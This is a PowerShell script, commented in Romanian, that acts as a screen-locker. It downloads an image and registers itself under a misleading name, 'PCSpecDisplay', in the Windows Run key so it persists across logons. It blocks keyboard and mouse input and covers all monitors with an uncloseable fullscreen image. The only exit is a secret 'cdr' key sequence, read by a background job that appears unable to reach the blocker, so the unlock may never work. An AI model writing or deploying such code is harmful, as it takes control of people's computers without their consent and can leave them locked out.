# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Funcție pentru descărcarea imaginii
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Blochează tastatura
function Block-Keyboard {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class KeyboardBlocker {
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool BlockInput(bool fBlockIt);
}
"@
    [KeyboardBlocker]::BlockInput($true)
}

# Ascultă pentru secvența "cdr"
function ListenForUnlock {
    $unlockSequence = "cdr"
    $currentInput = ""

    while ($true) {
        Start-Sleep -Milliseconds 100
        for ($i = 0; $i -lt 256; $i++) {
            if ([KeyboardBlocker]::GetAsyncKeyState($i) -ne 0) {
                $key = [char]$i
                $currentInput += $key.ToLower()
                if ($currentInput -like "*$unlockSequence") {
                    Stop-All
                }
                if ($currentInput.Length -gt $unlockSequence.Length) {
                    $currentInput = $currentInput.Substring(1)
                }
            }
        }
    }
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $form.Add_FormClosing({
            param($sender, $eventArgs)
            $eventArgs.Cancel = $true
        })

        $forms += $form
    }

    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației
function Stop-All {
    [KeyboardBlocker]::BlockInput($false)
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Configurează pornirea automată
function Configure-Startup {
    $scriptPath = $MyInvocation.MyCommand.Definition
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $scriptName = "PCSpecDisplay"
    Set-ItemProperty -Path $regPath -Name $scriptName -Value "powershell -ExecutionPolicy Bypass -File `"$scriptPath`""
}

# Descărcare imagine și rulare
Download-Image
Configure-Startup

# Pornire aplicație
Start-Job -ScriptBlock { ListenForUnlock }
Block-Keyboard
Show-FullScreenImage
